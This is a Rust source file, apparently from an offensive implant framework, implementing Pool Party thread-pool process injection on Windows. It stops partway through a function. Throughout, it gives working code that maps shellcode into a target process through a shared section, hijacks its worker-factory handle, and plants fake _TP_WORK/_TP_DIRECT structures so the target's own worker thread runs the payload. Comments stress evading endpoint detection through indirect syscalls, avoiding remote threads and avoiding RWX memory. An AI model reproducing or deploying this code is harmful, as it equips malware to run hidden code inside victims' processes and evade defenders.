//! ThreadPool (Pool Party) injection primitives — research-grade, threadless.
//!
//! ## HONESTY NOTE (P0-5, updated 2026-07-15)
//!
//! BOTH halves of Pool Party are now implemented: section-backed payload
//! delivery (no `VirtualAllocEx` / `WriteProcessMemory`) AND threadless
//! thread-pool dispatch (no `NtCreateThreadEx` / `CreateRemoteThread`). When
//! armed via `NYX_POOL_PARTY_ON=1`, [`pool_party_inject`] delivers the shellcode
//! through a shared section and then dispatches it by splicing a fake
//! `_TP_WORK` into the target's worker-factory queue via [`threadless_inject`]
//! — the target's existing `ntdll!TppWorkerThread` dequeues and runs it, so the
//! classic remote-thread IOC is **NOT present** on the happy path.
//!
//! ## What IS implemented
//!
//! Section-backed payload delivery (the "no `VirtualAllocEx` /
//! `WriteProcessMemory`" half):
//!
//! 1. `NtCreateSection` a page-file-backed section large enough for shellcode.
//! 2. `NtMapViewOfSection` it into BOTH the implant (writer) and the target
//!    process (reader) — copy-on-write gives each a private view.
//! 3. Write the shellcode into the LOCAL view (no `WriteProcessMemory`).
//!
//! Threadless dispatch (the "no `NtCreateThreadEx`" half), in
//! [`threadless_inject`]:
//!
//! 1. Resolve the indirect-syscall runtime (no direct syscall instruction in
//!    implant memory — RIP-of-syscall stays inside ntdll).
//! 2. Hijack a handle to the target's thread-pool *worker factory*: prefer
//!    `NtQueryInformationProcess(ProcessHandleInformation=51)` on the target
//!    (SafeBreach / Teach2Breach), fall back to the system-wide
//!    `SystemExtendedHandleInformation` table. Duplicate each handle and
//!    probe with `NtQueryInformationWorkerFactory(WorkerFactoryBasicInformation=7)`
//!    — the only documented QUERY class. A hit returns the worker factory handle.
//! 3. Allocate an RW stub region in the target (`NtAllocateVirtualMemory`,
//!    indirect), write a crafted `_TP_DIRECT` (callback = section view) +
//!    `_TP_WORK` (direct = the TP_DIRECT) into it
//!    (`NtWriteVirtualMemory`, indirect), then protect the stub RX. The
//!    section view is mapped RX in the target (local writer view is RW).
//!    Steady-state executable memory is never RWX (0x40).
//! 4. Enqueue the fake work item with
//!    `NtSetInformationWorkerFactory(WorkerFactoryTimeout)` (indirect, 5-arg).
//!    The existing worker thread dequeues it and calls
//!    `Direct->Callback(Direct)` → shellcode in the section view executes.
//!    **NO remote thread is created.**
//!
//! ## Research-grade honesty
//!
//! The `_TP_WORK` / `_TP_DIRECT` layouts are undocumented and drift across
//! Windows versions. The structures below are sourced from SafeBreach's
//! published Pool Party research (2023) and have been observed stable on
//! Win10 17763–Win11 22H2; they are NOT guaranteed on Insider builds. The
//! `pool_party_inject` fn is gated behind `POOL_PARTY_ENABLED` (default OFF) —
//! the operator flips it via `NYX_POOL_PARTY_ON=1` after validating on target.
//! **The `_TP_DIRECT`/`_TP_WORK` offsets MUST be re-validated per build** — if
//! the worker-factory enqueue is rejected or crashes, suspect an offset drift
//! and rebuild with the corrected constants (`TP_DIRECT_CALLBACK_OFFSET`,
//! `TP_WORK_DIRECT_OFFSET`, `TP_DIRECT_SIZE`, `TP_WORK_SIZE`).
//!
//! On any failure (structure mismatch, no TP worker, section/map failure) the
//! caller degrades to `module_stomp` (method 2) so the command stays functional.
//!
//! ## Hosted Server 2025 (build 26100) — selftest 0x5 vs skip 0x9
//!
//! Hosted first-run recorded `nyx_selftest_inject_pool` exit **0x5** (bit0
//! spawn + bit2 WARN-degrade). That 0x5 is the **selftest bitmask**, not
//! Win32 `ERROR_ACCESS_DENIED`, though `OpenProcess` GLE=5 is one path into
//! the same degrade. From code:
//!
//! 1. `SYSTEM_HANDLE_INFORMATION_EX` on x64 is `NumberOfHandles` @0x00,
//!    `Reserved` @0x08, `Handles[]` @**0x10** (Geoff Chappell / phnt). A
//!    parse that starts Handles at 0x08 yields 0 PID hits →
//!    `"hijack: target has no worker-factory handle"`.
//! 2. When `C:\nyx_test\nyx_x64_sleeper.exe` is not deployed, the selftest
//!    falls back to running `notepad.exe`, which may hold **no** worker-
//!    factory handle (lazy TP). That is an environment skip, not a pass.
//! 3. `OpenProcess` GLE=5 (`ERROR_ACCESS_DENIED`) after the sacrificial
//!    already exited (AppX stub / Session 0) is the same env class.
//!
//! `nyx_selftest_inject_pool` sets **bit3** (exit 0x9 with bit0) for (2)/(3)
//! so the hosted matrix can distinguish skip vs 0x5 WARN-fail. Do not treat
//! 0x9 as success.

#![cfg(target_os = "windows")]

use core::ffi::c_void;
use nyx_implant_core::heap::String;
use nyx_implant_core::resolve;

/// Pool Party master switch. OFF by default — research-grade, operator opts in
/// with `NYX_POOL_PARTY_ON=1` at build time. When ON, `pool_party_inject`
/// delivers via shared section and dispatches via [`threadless_inject`] (worker
/// queue splice — NO `NtCreateThreadEx`). When OFF, `do_inject` rewrites method
/// 0 to method 2 (module stomp) with a warning. **The `_TP_DIRECT`/`_TP_WORK`
/// offsets below need per-build validation** — see the honesty note at the top.
static POOL_PARTY_ENABLED: core::sync::atomic::AtomicBool =
    core::sync::atomic::AtomicBool::new(pool_party_default_on());

const fn pool_party_default_on() -> bool {
    match option_env!("NYX_POOL_PARTY_ON") {
        Some(v) => v.len() == 1 && v.as_bytes()[0] == b'1',
        None => false,
    }
}

/// Whether Pool Party is armed. `do_inject` reads this to decide method-0
/// dispatch.
pub fn pool_party_enabled() -> bool {
    POOL_PARTY_ENABLED.load(core::sync::atomic::Ordering::Acquire)
}

/// Arm/disarm Pool Party at runtime. Returns the previous value.
pub fn set_pool_party_enabled(on: bool) -> bool {
    POOL_PARTY_ENABLED.swap(on, core::sync::atomic::Ordering::Release)
}

// ============================================================================
// NT section/threadpool syscalls (raw export pointers; bypass the shared
// indirect-syscall trampoline per the single-trampoline rule)
// ============================================================================

type NtCreateSectionFn = unsafe extern "system" fn(
    *mut *mut c_void, // SectionHandle (out)
    u32,              // DesiredAccess
    *const c_void,    // ObjectAttributes (opt, null)
    *const i64,       // MaximumSize (opt)
    u32,              // PageProtection
    u32,              // AllocationAttributes
    *mut c_void,      // FileHandle (opt, null for page-file-backed)
) -> i32;

type NtMapViewOfSectionFn = unsafe extern "system" fn(
    *mut c_void,      // SectionHandle
    *mut c_void,      // ProcessHandle
    *mut *mut c_void, // BaseAddress (in/out)
    usize,            // ZeroBits
    usize,            // CommitSize
    *mut i64,         // SectionOffset (in/out, PLARGE_INTEGER)
    *mut usize,       // ViewSize (in/out)
    u32,              // InheritDisposition
    u32,              // AllocationType
    u32,              // Win32Protect
) -> i32;

type NtUnmapViewOfSectionFn = unsafe extern "system" fn(
    *mut c_void, // ProcessHandle
    *mut c_void, // BaseAddress
) -> i32;

type NtQueryInformationThreadFn = unsafe extern "system" fn(
    *mut c_void, // ThreadHandle
    u32,         // ThreadInformationClass
    *mut c_void, // ThreadInformation (out)
    u32,         // ThreadInformationLength
    *mut u32,    // ReturnLength (opt)
) -> i32;

/// Resolve the four section/TP syscalls via `ntdll` raw exports. Returns
/// `None` if any export is missing.
fn resolve_section_fns() -> Option<(
    NtCreateSectionFn,
    NtMapViewOfSectionFn,
    NtUnmapViewOfSectionFn,
    NtQueryInformationThreadFn,
)> {
    let cs: NtCreateSectionFn =
        unsafe { core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtCreateSection")?) };
    let mv: NtMapViewOfSectionFn =
        unsafe { core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtMapViewOfSection")?) };
    let uv: NtUnmapViewOfSectionFn = unsafe {
        core::mem::transmute(resolve::export_addr(b"ntdll.dll", b"NtUnmapViewOfSection")?)
    };
    let qi: NtQueryInformationThreadFn = unsafe {
        core::mem::transmute(resolve::export_addr(
            b"ntdll.dll",
            b"NtQueryInformationThread",
        )?)
    };
    Some((cs, mv, uv, qi))
}

// ============================================================================
// Undocumented TP structures (SafeBreach Pool Party research, 2023)
// ============================================================================
//
// These layouts were reverse-engineered from ntdll on Win10 17763 / Win11
// 22621. They are NOT in any Windows SDK header. Drift across builds is
// possible; [`threadless_inject`] validates offsets at runtime where it can,
// but the structural assumptions below are the research-grade core.
//
// ⚠ OFFSET VALIDATION (2026-07-15): the SafeBreach TP_WORK variant-2 layout
// places the dispatch callback at `_TP_DIRECT + 0x00` and the back-pointer to
// the `_TP_DIRECT` at `_TP_WORK + 0x30`. These are stable on Win10 17763–Win11
// 22H2 but MUST be re-validated per build; if `NtSetInformationWorkerFactory`
// rejects the enqueue or the target's `TppWorkerThread` faults, suspect a
// drift and rebuild with corrected constants. The structs below are padded to
// their documented sizes so raw byte buffers (used for cross-process writes)
// match the on-target layout exactly.

/// `_TP_DIRECT` — the structure a thread pool work item's `Direct` field
/// points at. The dispatch callback lives at offset `0x00` (the first qword):
/// the scheduler does `Direct->Callback(Direct)` to dispatch a work item, so we
/// write our shellcode address (in the section view) here. The struct is padded
/// to its documented `0x40`-byte size so the raw buffer written across the
/// process boundary matches the on-target layout exactly.
///
/// `FullDllName` is NULL (we are not impersonating a loader-style work item);
/// only `Callback` is load-bearing.
#[repr(C)]
pub struct TpDirect {
    /// Dispatch callback — `fn(*mut _TP_DIRECT)`. We overwrite this with the
    /// shellcode address (in the section view). At offset `0x00`.
    pub callback: usize,
    // Padding to the documented 0x40-byte `_TP_DIRECT` size. All non-callback
    // fields are zeroed — FullDllName is NULL, the function-table pointers are
    // unused on the minimal dispatch path the splice triggers.
    _pad: [u8; TP_DIRECT_SIZE - core::mem::size_of::<usize>()],
}

/// Documented size of `_TP_DIRECT` (SafeBreeze research). The whole struct is
/// written into the target so the size must match the on-target layout.
pub const TP_DIRECT_SIZE: usize = 0x40;

/// Offset of `TpDirect::callback` from the struct base — `0x00`. The Windows
/// thread-pool scheduler reads `Direct->Callback` at this offset to dispatch
/// work items.
pub const TP_DIRECT_CALLBACK_OFFSET: usize = 0x00;

/// `_TP_WORK` — a thread pool work item. The scheduler dequeues these and
/// invokes `Work.Direct->Callback(Direct, ...)`. We craft one whose `Direct`
/// field (offset `0x30`) leads to a controlled [`TpDirect`] whose callback is
/// our shellcode. The struct is padded to its documented `0x50`-byte size.
#[repr(C)]
pub struct TpWork {
    // Pool header + list links + state occupy the first 0x30 bytes. Only
    // `Direct` is load-bearing for the splice.
    _hdr: [u8; TP_WORK_DIRECT_OFFSET],
    /// Pointer to the `_TP_DIRECT` for this work item — at offset `0x30`.
    pub direct: usize,
    _pad: [u8; TP_WORK_SIZE - TP_WORK_DIRECT_OFFSET - core::mem::size_of::<usize>()],
}

/// Documented size of `_TP_WORK` (SafeBreeze research). Written in full into
/// the target so it must match the on-target layout.
pub const TP_WORK_SIZE: usize = 0x50;

/// Offset of `TpWork::direct` from the struct base — `0x30`. The Windows
/// thread-pool scheduler reads `Work.Direct` at this offset to find the
/// `_TP_DIRECT` (and hence the callback) for a work item.
pub const TP_WORK_DIRECT_OFFSET: usize = 0x30;

// ============================================================================
// Worker-factory syscall prototypes + info classes
// ============================================================================

/// `NtQueryInformationWorkerFactory(WorkerFactoryHandle,
/// WorkerFactoryInformationClass, Buffer, Length, ReturnLength)` — 5 args.
/// Used to probe a duplicated handle: if it returns `STATUS_SUCCESS` the handle
/// really is a worker factory.
type NtQueryInformationWorkerFactoryFn = unsafe extern "system" fn(
    *mut c_void, // WorkerFactoryHandle
    u32,         // WorkerFactoryInformationClass
    *mut c_void, // WorkerFactoryInformation (out)
    u32,         // WorkerFactoryInformationLength
    *mut u32,    // ReturnLength (opt)
) -> i32;

/// `NtSetInformationWorkerFactory(WorkerFactoryHandle,
/// WorkerFactoryInformationClass, Buffer, Length)` — 4 args. Used to enqueue a
/// crafted `_TP_WORK` via the `WorkerFactoryTimeout` info class — the worker
/// factory then arms the work item for the next scheduler pass.
type NtSetInformationWorkerFactoryFn = unsafe extern "system" fn(
    *mut c_void,   // WorkerFactoryHandle
    u32,           // WorkerFactoryInformationClass
    *const c_void, // WorkerFactoryInformation (in)
    u32,           // WorkerFactoryInformationLength
) -> i32;

/// `WorkerFactoryBasicInformation` (7) — the only documented QUERY class
/// (`QUERY_WORKERFACTORYINFOCLASS` in SafeBreach PoolParty; phnt). Classes
/// 0–2 are SET timeouts (`WorkerFactoryTimeout` / `RetryTimeout` /
/// `IdleTimeout`). Hosted Server 2025 `inject_pool` 0x9 used class 2 against
/// a 32-byte buffer, which cannot identify a `TpWorkerFactory`.
const WORKER_FACTORY_BASIC_INFORMATION: u32 = 7;

/// Size of `WORKER_FACTORY_BASIC_INFORMATION` plus slack (phnt: ~116 bytes
/// on x64). A 32-byte probe with class 7 returns `STATUS_INFO_LENGTH_MISMATCH`
/// and would be mistaken for a non-factory.
const WORKER_FACTORY_BASIC_INFO_BUF: usize = 256;

/// `WorkerFactoryTimeout` info class for `NtSetInformationWorkerFactory`. The
/// SafeBreach TP_WORK variant feeds the crafted work item pointer here; the
/// worker factory enqueues it and the existing `TppWorkerThread` dequeues +
/// dispatches it on its next loop pass.
const WORKER_FACTORY_TIMEOUT: u32 = 1;

/// `SystemExtendedHandleInformation` (class 64) for
/// `NtQuerySystemInformation` — returns `SYSTEM_HANDLE_INFORMATION_EX` (the
/// per-handle table with owner PID + object-type index), used to discover
/// worker-factory handles owned by the target process.
const SYSTEM_EXTENDED_HANDLE_INFORMATION: u32 = 64;

/// Object-type index for *WorkerFactory* objects (resolved at runtime by a
/// name-matching probe of `ObQueryNameInfo`-style data). We avoid a hard-coded
/// index (it varies across Windows builds) and instead identify a worker
/// factory purely by `NtQueryInformationWorkerFactory` succeeding — see
/// [`hijack_worker_factory`].
const DUPLICATE_SAME_ACCESS: u32 = 0x0002;

/// `STANDARD_RIGHTS_REQUIRED | WORKER_FACTORY_{RELEASE,WAIT,SET,QUERY,READY,SHUTDOWN}`
/// (SafeBreach `WORKER_FACTORY_ALL_ACCESS`). DuplicateHandle requests this
/// first so `NtQueryInformationWorkerFactory` is allowed; SAME_ACCESS is the
/// fallback when the target handle cannot be opened with these rights.
const WORKER_FACTORY_ALL_ACCESS: u32 = 0x000F_003F;

/// `NtQueryInformationProcess` info class 51 — snapshot of *this* process's
/// handle table (Windows 8+). Safer than walking the system-wide table.
const PROCESS_HANDLE_INFORMATION: u32 = 51;

// ============================================================================
// pool_party_inject
// ============================================================================

/// Inject `shellcode` into the target process via Pool Party: section-backed
/// delivery (no `VirtualAllocEx` / `WriteProcessMemory` for the payload) +
/// threadless dispatch (no `NtCreateThreadEx` / `CreateRemoteThread`). Returns
/// `Ok(())` on success, `Err` with a diagnostic string on any failure (caller
/// degrades to `module_stomp`).
///
/// # Steps
/// 1. Resolve `NtCreateSection`/`NtMapViewOfSection`/`NtUnmapViewOfSection`.
/// 2. `NtCreateSection` (page-file-backed, size = round_up(shellcode.len())).
/// 3. `NtMapViewOfSection` into the implant (writer) + the target (reader).
/// 4. Copy shellcode into the local view (no `WriteProcessMemory`).
/// 5. Map the section into the target; unmap the local view.
/// 6. Hand the target section view to [`threadless_inject`], which hijacks a
///    worker-factory handle, crafts a `_TP_DIRECT` (callback = shellcode view)
///    + fake `_TP_WORK`, and enqueues it via
///    `NtSetInformationWorkerFactory(WorkerFactoryTimeout)`.
/// 7. The target's existing `ntdll!TppWorkerThread` dequeues the work item and
///    invokes `Direct->Callback(Direct)` → shellcode executes from the section
///    view. **No remote thread is created.**
///
/// # ⚠ P5 FIXED (2026-07-06): `addr_of_mut!` ABI correction
/// The `STATUS_ACCESS_VIOLATION` (0xC0000005) on Server 2019 17763.1339 was
/// caused by using `&mut local_base` (Rust ref-to-raw-pointer coercion) for
/// the `NtCreateSection`/`NtMapViewOfSection` out-params. Under the
/// stacked-borrows model with transmuted function pointers, the compiler may
/// not track the kernel's write through a `&mut`-derived raw pointer correctly.
/// The fix replaces every `&mut $out` with `core::ptr::addr_of_mut!($out)`
/// (matching the working pattern in `unhook.rs::fresh_ntdll_text`), which
/// creates the double-pointer directly from the local's address without an
/// intermediate `&mut` reference.
pub unsafe fn pool_party_inject(target_pid: u32, shellcode: &[u8]) -> Result<(), String> {
    let (create_section, map_view, unmap_view, _query_thread) =
        resolve_section_fns().ok_or_else(|| String::from("ntdll section exports missing"))?;
    // GetCurrentProcess pseudo-handle = (HANDLE)-1.
    const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;

    let target_h = pool_party_open_target(target_pid)?;
    let (section_h, section_size) = pool_party_create_section(create_section, shellcode)?;
    let local_base = pool_party_map_local(map_view, section_h, section_size)?;
    pool_party_write_local(local_base, shellcode);
    let target_base = match pool_party_map_target(
        map_view,
        section_h,
        target_h,
        section_size,
        crate::stealth::desired_final_protect(),
    ) {
        Ok(b) => b,
        Err(e) => {
            // Unmap local before bailing.
            unsafe { unmap_view(CUR_PROCESS, local_base) };
            return Err(e);
        }
    };
    // The local view is unmapped before dispatch: the section backs the target
    // view, and the shellcode is already resident in the target.
    unsafe { unmap_view(CUR_PROCESS, local_base) };
    pool_party_dispatch(target_h, target_pid, target_base)
}

/// Access mask for the pool-party target handle: VM_OPERATION (section map) +
/// VM_WRITE (the `_TP_DIRECT`/`_TP_WORK` struct writes — threadless_inject's
/// own doc requires it) + DUP_HANDLE (worker-factory handle) + QUERY_INFO.
const POOL_PARTY_TARGET_ACCESS: u32 = 0x0008 | 0x0020 | 0x0040 | 0x0400;

/// Open the target process (VM_OP | VM_WRITE | DUP_HANDLE | QUERY_INFO).
unsafe fn pool_party_open_target(target_pid: u32) -> Result<*mut c_void, String> {
    // ---- 1. Open the target process (POOL_PARTY_TARGET_ACCESS) ----
    let open_process_addr = resolve::export_addr(b"kernel32.dll", b"OpenProcess")
        .ok_or_else(|| String::from("kernel32!OpenProcess export missing"))?;
    let open_process: unsafe extern "system" fn(u32, i32, u32) -> *mut c_void =
        unsafe { core::mem::transmute(open_process_addr) };
    // 2026-08-24: the mask previously omitted PROCESS_VM_WRITE (0x0020),
    // contradicting threadless_inject's documented handle contract — the
    // struct writes would have failed with STATUS_ACCESS_DENIED (0xC0000022)
    // after the worker factory was found.
    let access = POOL_PARTY_TARGET_ACCESS;
    // SAFETY: target_pid is the operator-supplied PID; OpenProcess returns a
    // handle or null.
    let target_h = unsafe { open_process(access, 0, target_pid) };
    if target_h.is_null() {
        let mut s = String::from("OpenProcess(target) failed gle=");
        nyx_implant_core::fmt::push_decimal_u32(&mut s, last_error());
        return Err(s);
    }
    Ok(target_h)
}

/// `kernel32!GetLastError`, or 0 if unresolved.
fn last_error() -> u32 {
    let addr = match unsafe { resolve::export_addr(b"kernel32.dll", b"GetLastError") } {
        Some(a) => a,
        None => return 0,
    };
    let gle: unsafe extern "system" fn() -> u32 = unsafe { core::mem::transmute(addr) };
    unsafe { gle() }
}

/// True when a pool-party `Err` string is an environment skip (no worker
/// factory in the probe process, OpenProcess denied/gone), not a product
/// failure. Consumed by `nyx_selftest_inject_pool` bit3 (exit 0x9).
pub fn is_env_skip(err: &str) -> bool {
    err.contains("no worker-factory") || err.contains("OpenProcess(target) failed")
}

/// NtCreateSection (page-file-backed, RWX view). Returns (section, size).
unsafe fn pool_party_create_section(
    create_section: NtCreateSectionFn,
    shellcode: &[u8],
) -> Result<(*mut c_void, i64), String> {
    // ---- 2. NtCreateSection (page-file-backed). 0x40 is the section MAX
    // protect so an RX target view is allowed; views themselves are RW local /
    // RX remote — never RWX as the mapped VAD. ----
    // Section size rounded up to a page (4096).
    let section_size: i64 = ((shellcode.len() + 0xFFF) & !0xFFF) as i64;
    let mut section_h: *mut c_void = core::ptr::null_mut();
    // PAGE_EXECUTE_READWRITE = 0x40 (MAX); SEC_COMMIT = 0x8000000.
    let st = unsafe {
        create_section(
            core::ptr::addr_of_mut!(section_h),
            0x000F001F, // SECTION_ALL_ACCESS
            core::ptr::null(),
            &section_size as *const i64,
            0x40,        // PAGE_EXECUTE_READWRITE
            0x0800_0000, // SEC_COMMIT
            core::ptr::null_mut(),
        )
    };
    if st < 0 {
        return Err(String::from("NtCreateSection failed"));
    }
    Ok((section_h, section_size))
}

/// Map the section into the implant (writer view).
unsafe fn pool_party_map_local(
    map_view: NtMapViewOfSectionFn,
    section_h: *mut c_void,
    section_size: i64,
) -> Result<*mut c_void, String> {
    // ---- 3. Map the section into the implant (writer) ----
    let mut local_base: *mut c_void = core::ptr::null_mut();
    let mut local_size: usize = 0;
    // GetCurrentProcess pseudo-handle = (HANDLE)-1.
    const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;
    let st = unsafe {
        map_view(
            section_h,
            CUR_PROCESS,
            core::ptr::addr_of_mut!(local_base),
            0,
            section_size as usize,
            core::ptr::null_mut(),
            core::ptr::addr_of_mut!(local_size),
            1, // ViewShare
            0,
            crate::stealth::payload_alloc_protect(), // PAGE_READWRITE — writer view
        )
    };
    if st < 0 {
        return Err(String::from("NtMapViewOfSection(local) failed"));
    }
    Ok(local_base)
}

/// Copy the shellcode into the local view (no WriteProcessMemory).
unsafe fn pool_party_write_local(local_base: *mut c_void, shellcode: &[u8]) {
    // ---- 4. Write the shellcode into the local view ----
    // SAFETY: local_base is a fresh RWX view of size local_size; shellcode
    // fits in the rounded-up section.
    unsafe {
        core::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_base as *mut u8, shellcode.len());
    }
}

/// Map the section into the target process (reader view). The caller unmaps
/// the local view on failure.
///
/// `view_protect` is the target-process mapping protection. Pool Party
/// shellcode uses RX (`desired_final_protect`). Isolated BOF maps the same
/// section as RWX: the sacrificial child runs `bof-host` from this view *and*
/// the appended payload sits in the same mapping; RX made the child AV
/// (`0xC0000005`) on Windows CI. That RWX is bounded to the short-lived BOF
/// worker, not the implant image.
unsafe fn pool_party_map_target(
    map_view: NtMapViewOfSectionFn,
    section_h: *mut c_void,
    target_h: *mut c_void,
    section_size: i64,
    view_protect: u32,
) -> Result<*mut c_void, String> {
    // ---- 5. Map the section into the target process ----
    let mut target_base: *mut c_void = core::ptr::null_mut();
    let mut target_size: usize = 0;
    let st = unsafe {
        map_view(
            section_h,
            target_h,
            core::ptr::addr_of_mut!(target_base),
            0,
            section_size as usize,
            core::ptr::null_mut(),
            core::ptr::addr_of_mut!(target_size),
            1,
            0,
            view_protect,
        )
    };
    if st < 0 {
        return Err(String::from("NtMapViewOfSection(target) failed"));
    }
    Ok(target_base)
}

/// Deliver `bytes` into `target_h`'s address space through a page-file-backed
/// section (no `VirtualAllocEx` / `WriteProcessMemory`): create → map local →
/// copy → map target → unmap local. Returns the target view base. This is the
/// delivery half of [`pool_party_inject`] reused by the B3 isolated-BOF path
/// (`bof_isolated.rs`), which already owns a suspended sacrificial child and
/// dispatches by hijacking its main thread instead of the worker-factory
/// splice. Unlike `pool_party_inject` (whose section-handle leak is documented
/// as benign for a one-shot inject), the section handle IS closed here once
/// both views exist — the views keep the object alive, and a BOF per beacon
/// cycle must not leak one handle per run. On any failure the local view is
/// unmapped and the section handle closed before `Err`.
pub(crate) unsafe fn section_deliver(target_h: *mut c_void, bytes: &[u8]) -> Result<usize, String> {
    let (create_section, map_view, unmap_view, _query_thread) =
        resolve_section_fns().ok_or_else(|| String::from("ntdll section exports missing"))?;
    // GetCurrentProcess pseudo-handle = (HANDLE)-1.
    const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;

    let (section_h, section_size) = pool_party_create_section(create_section, bytes)?;
    let local_base = match pool_party_map_local(map_view, section_h, section_size) {
        Ok(b) => b,
        Err(e) => {
            unsafe { close_handle(section_h) };
            return Err(e);
        }
    };
    unsafe { pool_party_write_local(local_base, bytes) };
    // Isolated BOF: same section holds PIC host + appended payload. The child
    // executes AND writes the tail; RX (Pool Party shellcode policy) AV'd.
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    let target_base = match pool_party_map_target(
        map_view,
        section_h,
        target_h,
        section_size,
        PAGE_EXECUTE_READWRITE,
    ) {
        Ok(b) => b,
        Err(e) => {
            unsafe { unmap_view(CUR_PROCESS, local_base) };
            unsafe { close_handle(section_h) };
            return Err(e);
        }
    };
    unsafe { unmap_view(CUR_PROCESS, local_base) };
    unsafe { close_handle(section_h) };
    Ok(target_base as usize)
}

/// Threadless dispatch via worker-queue splice.
///
/// The section now holds the shellcode in the target's address space at
/// `target_base`. Instead of `NtCreateThreadEx(target, target_base)` (which
/// creates the classic remote-thread IOC), we dispatch threadlessly:
///
///   (a) [`threadless_inject`] hijacks a worker-factory handle from the
///       target by walking the system handle table and duplicating each
///       handle owned by `target_pid`, probing each duplicate with
///       `NtQueryInformationWorkerFactory` until one succeeds.
///   (b) It allocates a small RW stub region in the target (indirect
///       syscalls — no direct syscall instruction in implant memory),
///       writes a crafted `_TP_DIRECT` (callback = `target_base`) + a fake
///       `_TP_WORK` (direct = the `_TP_DIRECT` address) into it, then
///       protects the stub RX.
///   (c) It enqueues the work item with
///       `NtSetInformationWorkerFactory(WorkerFactoryTimeout)` (indirect).
///       The target's existing `ntdll!TppWorkerThread` dequeues it on its
///       next scheduler pass and calls `Direct->Callback(Direct)` → the
///       shellcode in the section view runs. **NO remote thread is created.**
///
/// On any failure (no worker factory in the target, struct write rejected,
/// enqueue rejected) we return `Err` so the caller degrades to module_stomp.
unsafe fn pool_party_dispatch(
    target_h: *mut c_void,
    target_pid: u32,
    target_base: *mut c_void,
) -> Result<(), String> {
    let res = unsafe { threadless_inject(target_h, target_pid, target_base) };

    // Closing the target handle is best-effort; the caller (do_inject) does not
    // reuse it. A leak is benign for a single inject.
    unsafe { close_handle(target_h) };

    match res {
        Ok(()) => Ok(()),
        Err(e) => Err(e),
    }
}

// ============================================================================
// threadless_inject — worker-factory queue splice (NO NtCreateThreadEx)
// ============================================================================

/// Threadless dispatch: enqueue a fake `_TP_WORK` into the target's thread-pool
/// worker factory so the target's existing `ntdll!TppWorkerThread` executes the
/// already-mapped shellcode. **No remote thread is created** (no
/// `NtCreateThreadEx`, no `CreateRemoteThread`) — this is the SafeBreach Pool
/// Party variant-2 (TP_WORK injection) dispatch path.
///
/// # Arguments
/// * `target_h` — handle to the target process (`PROCESS_DUP_HANDLE` +
///   `PROCESS_VM_OPERATION` + `PROCESS_VM_WRITE`). The caller already opened
///   it for section delivery.
/// * `target_pid` — the target's PID (used to filter the system handle table
///   during worker-factory discovery).
/// * `shellcode_addr` — address of the shellcode in the TARGET's address space
///   (the section view mapped by `pool_party_inject`). Becomes the
///   `_TP_DIRECT.Callback`.
///
/// # Returns
/// `Ok(())` on successful enqueue, `Err` with a diagnostic on any failure —
/// the caller degrades to `module_stomp`.
///
/// # Safety
/// Cross-process handle duplication, VM allocation/write, and worker-factory
/// mutation. All syscalls are indirect (via the global `syscalls::Runtime`) so
/// no `syscall` instruction executes from implant memory. Single-threaded
/// beacon context.
///
/// # ⚠ Per-build validation
/// The `_TP_DIRECT` (callback @ `0x00`, size `0x40`) and `_TP_WORK` (direct @
/// `0x30`, size `0x50`) layouts are stable on Win10 17763–Win11 22H2 but drift
/// on Insider builds. If the enqueue is rejected or the worker faults, suspect
/// an offset mismatch and rebuild with corrected constants.
pub unsafe fn threadless_inject(
    target_h: *mut c_void,
    target_pid: u32,
    shellcode_addr: *mut c_void,
) -> Result<(), String> {
    let (query_wf, set_wf) = threadless_resolve_syscalls()?;

    // The indirect-syscall runtime is required for the cross-process VM ops
    // (NtAllocateVirtualMemory / NtWriteVirtualMemory) — those go through the
    // typed wrappers so RIP-of-syscall stays inside ntdll.
    let rt = nyx_implant_core::syscalls::global()
        .ok_or_else(|| String::from("indirect syscall runtime not initialized"))?;

    // ---- 1. Hijack a worker-factory handle from the target ----
    let worker_factory_h = unsafe { hijack_worker_factory(target_h, target_pid, query_wf)? };

    // ---- 2. Build the crafted `_TP_DIRECT` + `_TP_WORK` in a local buffer ----
    let (direct_buf, mut work_buf, direct_offset_in_region, work_offset_in_region, region_size) =
        threadless_build_structs(shellcode_addr);

    // ---- 3. Allocate an RW stub region in the target (indirect syscall) ----
    let (remote_base, alloc_size) = match threadless_alloc_region(rt, target_h, region_size) {
        Ok(p) => p,
        Err(e) => {
            unsafe { close_handle(worker_factory_h) };
            return Err(e);
        }
    };

    // ---- 4. Patch the `_TP_WORK.direct` field with the remote `_TP_DIRECT` addr ----
    threadless_patch_direct(&mut work_buf, remote_base, direct_offset_in_region);

    // ---- 5. Write `_TP_DIRECT` then `_TP_WORK` into the target (indirect) ----
    if let Err(e) = threadless_write_structs(
        rt,
        target_h,
        remote_base,
        direct_offset_in_region,
        work_offset_in_region,
        &direct_buf,
        &work_buf,
    ) {
        unsafe { close_handle(worker_factory_h) };
        return Err(e);
    }

    // ---- 5b. RW → RX before enqueue. Fail-closed: never dispatch with RWX. ----
    if let Err(e) = threadless_protect_rx(rt, target_h, remote_base, alloc_size) {
        unsafe { close_handle(worker_factory_h) };
        return Err(e);
    }

    // ---- 6. Enqueue: NtSetInformationWorkerFactory(WorkerFactoryTimeout, &Work) ----
    threadless_enqueue(set_wf, worker_factory_h, remote_base, work_offset_in_region)
}

/// Resolve the worker-factory syscalls via ntdll raw exports. These bypass
/// the shared indirect-syscall trampoline per the single-trampoline rule
/// (matching the section syscalls above): only ONE syscall can be in flight
/// through the trampoline page at a time, so a nested indirect call from
/// inside spoof_wrap would race. The VM ops + enqueue below instead go
/// through the typed `nyx_implant_core::syscalls` wrappers, which DO serialize through
/// the trampoline safely because they do not nest.
unsafe fn threadless_resolve_syscalls() -> Result<
    (
        NtQueryInformationWorkerFactoryFn,
        NtSetInformationWorkerFactoryFn,
    ),
    String,
> {
    let query_wf: NtQueryInformationWorkerFactoryFn = unsafe {
        core::mem::transmute(
            resolve::export_addr(b"ntdll.dll", b"NtQueryInformationWorkerFactory")
                .ok_or_else(|| String::from("ntdll!NtQueryInformationWorkerFactory missing"))?,
        )
    };
    let set_wf: NtSetInformationWorkerFactoryFn = unsafe {
        core::mem::transmute(
            resolve::export_addr(b"ntdll.dll", b"NtSetInformationWorkerFactory")
                .ok_or_else(|| String::from("ntdll!NtSetInformationWorkerFactory missing"))?,
        )
    };
